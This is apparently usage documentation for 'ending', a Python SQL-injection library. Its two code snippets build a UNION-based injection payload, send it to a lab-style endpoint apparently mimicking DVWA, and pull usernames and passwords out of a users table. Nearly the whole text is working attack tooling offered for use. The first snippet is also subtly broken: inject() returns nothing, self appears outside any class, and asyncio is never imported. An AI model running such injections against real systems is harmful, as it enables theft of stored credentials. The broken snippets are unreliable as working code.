# Using ending as a python library

As for the CLI usage, you will need to setup a compiler, injection method, and an `inject` method.

As an example, this would do the same as the exploit described in the CLI.

## Skeleton code

```python
from ending.util import quoting
from ending.db import mysql
from ending.ast import Node, Query

query = Query("users").columns("user", "password")

# The inject() function performs the injection

async def inject(self, payload: Node) -> bytes:
    param = f"' UNION {payload} -- -"
    # Send request
    self.session.cookies["security"] = "low"
    response = await self.session.post(
        'http://172.17.0.2/vulnerabilities/sqli/',
        params={
            "id": param,
            "Submit": "Submit",
        }
    )

# Setup the compiler and method

compiler = mysql.Compiler(quote=quoting.hexadecimal)
method = mysql.SelectMethod(
    self.compiler,
    self.inject,
    # Method parameters
    columns=2,
    column=0,
    nb_rows=1,
)

# We're ready to go, run the query then display and store the results

async def main():
    results = await method.fetch(query)

    print(results)
    results.store('/tmp/my-results')

asyncio.run(main())
```

## Loading a design

If you already have a design for your injection, you import it using `DesignPath`.
Set it up, do your thing, and tear it down afterwards.

```python
#!/usr/bin/env python3

import asyncio

from ending.ast import *
from ending.cli.design import DesignDirectory


async def main():
    Design = DesignDirectory('/home/cf/ending/my-design').load()
    design = Design()
    
    query = Query("users").columns("user", "password")
    
    await design.setup()

    try:
        results = await design.method.fetch(query)
    finally:
        await design.teardown()
    
    print(results)
    

asyncio.run(main())
```
